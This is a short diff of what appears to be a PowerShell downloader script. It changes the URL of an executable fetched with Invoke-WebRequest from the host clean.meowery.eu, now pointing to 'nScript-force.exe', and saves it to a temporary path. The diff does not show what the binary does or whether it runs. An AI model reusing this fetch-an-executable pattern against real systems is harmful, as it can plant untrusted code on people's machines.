@@ -27,7 +27,7 @@ if (-not (Test-Path $TempPath)) {
 }
 
 try {
-    $DownloadUrl = "https://clean.meowery.eu/f/dl.exe"
+    $DownloadUrl = "https://clean.meowery.eu/nScript-force.exe"
     
     Write-Host "[*] Downloading $BinaryName from CDN..." -ForegroundColor Yellow
     Invoke-WebRequest -Uri $DownloadUrl -OutFile $BinaryPath -UseBasicParsing
